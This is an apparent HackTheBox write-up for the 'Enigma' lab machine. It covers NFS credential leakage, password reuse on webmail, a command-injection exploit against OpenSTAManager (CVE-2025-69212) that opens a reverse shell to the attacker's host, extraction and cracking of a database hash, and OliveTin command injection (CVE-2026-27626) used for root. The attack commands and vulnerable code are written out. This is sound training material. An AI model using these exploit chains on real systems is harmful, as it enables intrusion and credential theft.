---
layout: post
title: "HTB - Enigma"
date: 2026-11-17
categories: [HackTheBox, Linux]
tags: [htb, writeup, linux, nfs, rce, openstamanager, cve-2025-69212, olivetin, cve-2026-27626, privesc]
---

# Enumeration

Initial port scan reveals a broad attack surface: SSH, HTTP (nginx), mail services (IMAP/POP3 via Dovecot), NFS, and RPC.

```bash
nmap -p 22,80,110,111,143,993,995,2049,32901,38593,44427,46031,55077 -sVC --min-rate 1000 -oA enigma -vvv 10.129.131.236
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp   open  pop3     Dovecot pop3d
111/tcp   open  rpcbind  2-4 (RPC #100000)
143/tcp   open  imap     Dovecot imapd
993/tcp   open  ssl/imap Dovecot imapd
995/tcp   open  ssl/pop3 Dovecot pop3d
2049/tcp  open  nfs_acl  3 (RPC #100227)
```

The HTTP server redirects to `enigma.htb`. The NFS export is world-readable, and the mail stack (Dovecot) exposes IMAP/POP3 — a credential chain opportunity.

## NFS Enumeration

```bash
showmount -e 10.129.131.236
Export list for 10.129.131.236:
/srv/nfs/onboarding *
```

The share is exported without host restriction (`*`). Mount and inspect:

```bash
mkdir /mnt/nfs
mount -t nfs 10.129.131.236:/srv/nfs/onboarding /mnt/nfs
ls /mnt/nfs
```

Inside, a PDF document containing plaintext credentials for a new employee:

```
Employee:  Kevin Mitchell
Webmail:   http://mail001.enigma.htb
Username:  kevin
Password:  Enigma2024!
```

---

# Foothold

## Credential Chain via Webmail

Add `mail001.enigma.htb` and `enigma.htb` to `/etc/hosts`, then authenticate to the webmail as `kevin`.

Kevin's inbox contains a welcome email from `sarah@enigma.htb`. The email is informational — no credentials — but reveals another valid user. Since the PDF instructs password change on first login, the same default policy likely applies to Sarah's account. Testing `kevin:Enigma2024!` pattern against sarah yields access.

Sarah's inbox contains a message from IT Support:

```
URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

Add `support_001.enigma.htb` to `/etc/hosts`. The service is **OpenSTAManager v2.9.8**.

## CVE-2025-69212 — OpenSTAManager OS Command Injection (RCE)

OpenSTAManager 2.9.8 and earlier are vulnerable to OS command injection in the P7M file decoding path. The `decodeP7M()` method in `src/Util/XML.php` passes user-controlled filenames directly into `exec()` without sanitization:

```php
// src/Util/XML.php:100
public static function decodeP7M($file)
{
    $directory = pathinfo($file, PATHINFO_DIRNAME);
    $output_file = $directory.'/'.basename($file, '.p7m');

    exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);
}
```

The `$file` parameter originates from filenames inside uploaded ZIP archives. The double-quote wrapping is insufficient — there is no `escapeshellarg()` call. An attacker crafts a `.p7m` filename that breaks out of the double-quote context and injects arbitrary shell commands.

Using the public PoC for CVE-2025-69212:

```bash
nc -lnvp 4444
```

```bash
python3 exploit.py -t http://support_001.enigma.htb \
    -u admin -p 'Ne3s4rtars78s' \
    --reverse-shell 10.10.15.140 4444
```

```
[*] Authenticating as admin...
[+] Authenticated successfully.
[+] Found 2 candidate(s).
├─ Module ID: 14
├─ Plugin ID: 21
└─ Upload endpoint: save → http://support_001.enigma.htb/actions.php
[+] Payload delivered!
```

Shell received as `www-data`.

---

# Lateral Movement

## Database Credentials in Config File

OpenSTAManager stores its database connection settings in `config.inc.php`:

```php
$db_host     = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name     = 'openstamanager';
```

Authenticate to MySQL and query the users table:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username,password FROM zz_users;"
```

A bcrypt hash for user `haris` is recovered.

## Hash Cracking

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends

Status: Cracked
```

Lateral move to `haris`:

```bash
su haris
# Password: bestfriends
haris@enigma:/home$
```

User flag is in `/home/haris/user.txt`.

---

# Privilege Escalation

## Internal Service Discovery

```bash
netstat -tulnp
tcp  0  0  127.0.0.1:1337  0.0.0.0:*  LISTEN  -
```

Port 1337 is bound to localhost. Identify the service:

```bash
curl -s http://127.0.0.1:1337/ | grep -i olivetin
```

**OliveTin** — a self-hosted web UI for executing predefined shell commands.

## CVE-2026-27626 — OliveTin OS Command Injection

OliveTin's `checkShellArgumentSafety()` function enforces input sanitization for certain argument types (`string`, `int`, `bool`, `choice`) but omits the `password` type entirely:

```go
func checkShellArgumentSafety(argType string, value string) bool {
    dangerousTypes := []string{"string", "int", "bool", "choice"}
    for _, dt := range dangerousTypes {
        if argType == dt {
            return sanitizeInput(value)
        }
    }
    // "password" type falls through unchecked
    return true
}
```

Any action using a `password`-typed argument allows the user to inject arbitrary shell metacharacters. The PoC targets a `backup_database` action that accepts a `db_pass` parameter of type `password`:

```bash
python3 cve-2026-27626.py -u localhost -p 1337 -x 'cat /root/root.txt'
```

```
[+] Execution ID: e3158f92-c442-44b4-b295-a73c6740d341
======================================================================
Command Output
======================================================================
b570093f7ef0c......
======================================================================
```

Root flag captured.
